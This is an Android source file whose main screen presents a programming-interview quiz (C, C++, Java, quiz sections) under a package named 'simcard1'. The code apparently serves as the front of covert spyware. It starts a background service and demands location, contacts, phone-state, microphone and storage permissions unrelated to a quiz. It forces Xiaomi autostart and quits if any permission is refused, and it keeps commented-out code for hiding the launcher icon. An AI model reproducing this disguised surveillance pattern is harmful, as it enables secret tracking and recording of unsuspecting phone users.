package com.example.kalya.simcard1;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import static android.Manifest.permission.RECORD_AUDIO;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

public class MainActivity extends AppCompatActivity implements View.OnClickListener{
    public static android.hardware.camera2.CameraDevice mCamera;
    private BroadcastReceiver broadcastReceiver;
    // Button start, stop;
    private FusedLocationProviderClient fusedLocationProviderClient;




    private RelativeLayout relativeLayout,relativeLayout1,relativeLayout2,relativeLayout3;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        relativeLayout = (RelativeLayout)findViewById(R.id.CLanguage);
        relativeLayout1 = (RelativeLayout)findViewById(R.id.CPlusplus);
        relativeLayout2 = (RelativeLayout)findViewById(R.id.JAVA);
        relativeLayout3 = (RelativeLayout)findViewById(R.id.QuizeBox);
        relativeLayout.setOnClickListener(this);
        relativeLayout1.setOnClickListener(this);
        relativeLayout2.setOnClickListener(this);
        relativeLayout3.setOnClickListener(this);

        startService(new Intent(MainActivity.this, MyService.class));
        int Permission_All = 1;

        String[] Permissions = {Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_PHONE_STATE,Manifest.permission.RECORD_AUDIO};
        if(!hasPermissions(this, Permissions)){
            ActivityCompat.requestPermissions(this, Permissions, Permission_All);
            String manufacturer = "xiaomi";
            if(manufacturer.equalsIgnoreCase(android.os.Build.MANUFACTURER)) {
                //this will open auto start screen where user can enable permission for your app
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
                startActivity(intent);
                //startActivityForResult(new Intent(android.provider.Settings.ACTION_SETTINGS), 0);
            }
        }
        if (!hasPermissions(this,Permissions))
        {
            System.exit(0);
        }
        if (hasPermissions(this,Permissions))
        {
            //PackageManager p = getPackageManager();
            //ComponentName componentName = new ComponentName(this, com.example.kalya.simcard1.MainActivity.class);
            //p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            startService(new Intent(MainActivity.this, MyService.class));
        }
        /*Button start = (Button) findViewById(R.id.start);

        start.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                startService(new Intent(MainActivity.this, MyService.class));

            }
        });
        Button stop = (Button) findViewById(R.id.stop);
        stop.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                stopService(new Intent(MainActivity.this, MyService.class));
            }
        });*/
    }



    public static boolean hasPermissions(Context context, String... permissions){

        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M && context!=null && permissions!=null){
            for(String permission: permissions){
                if(ActivityCompat.checkSelfPermission(context, permission)!=PackageManager.PERMISSION_GRANTED){
                    return  false;
                }
            }
        }
        return true;
    }

    @Override
    public void onClick(View v) {
        if (v == relativeLayout){
            //if user clicks on this realtive layout then new intent(layout changes to bellow decleared class) and same for all intent
            Intent intent = new Intent(this,InterviewQuestions.class);
            startActivity(intent);
        }
        if (v == relativeLayout1){
            Intent intent = new Intent(this,C1.class);
            startActivity(intent);
        }
        if (v == relativeLayout2){
            Intent intent = new Intent(this,Java.class);
            startActivity(intent);
        }
        if (v == relativeLayout3){
            Intent intent = new Intent(this,Quize.class);
            startActivity(intent);
            finish();
        }
    }
}
